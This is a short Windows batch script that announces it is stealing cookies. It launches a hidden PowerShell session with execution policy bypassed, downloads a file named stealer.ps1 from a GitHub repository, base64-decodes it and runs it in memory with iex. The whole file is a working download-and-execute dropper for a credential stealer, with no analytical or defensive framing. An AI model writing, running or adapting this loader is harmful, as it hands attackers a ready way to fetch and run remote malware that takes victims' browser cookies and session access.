@echo off
echo Stealing cookies...
powershell -nop -exec bypass -WindowStyle Hidden -Command "$c=[System.Net.WebClient]::new().DownloadString('https://api.github.com/repos/isajarGamer2/stealer-repo/contents/stealer.ps1?ref=main');$j=$c|ConvertFrom-Json;iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j.content)))"
echo Done.
pause
